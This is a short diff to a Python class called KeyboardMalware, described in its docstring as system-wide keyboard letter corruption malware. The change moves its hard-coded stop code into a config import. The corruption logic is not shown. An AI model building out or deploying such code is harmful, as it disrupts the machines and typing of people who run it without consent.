@@ -4,6 +4,7 @@ import random
 import string
 import keyboard
 import time
+from config import STOP_CODE
 
 class KeyboardMalware:
     """System-wide keyboard letter corruption malware."""
@@ -12,7 +13,7 @@ class KeyboardMalware:
         self.suppressing = False
         self.running = True
         self.typed_buffer = ""
-        self.stop_code = "gwaposiralph"
+        self.stop_code = STOP_CODE  # loaded from config.py
         print("[*] Keyboard malware initialized")
         print(f"[*] Type '{self.stop_code}' to stop")
     
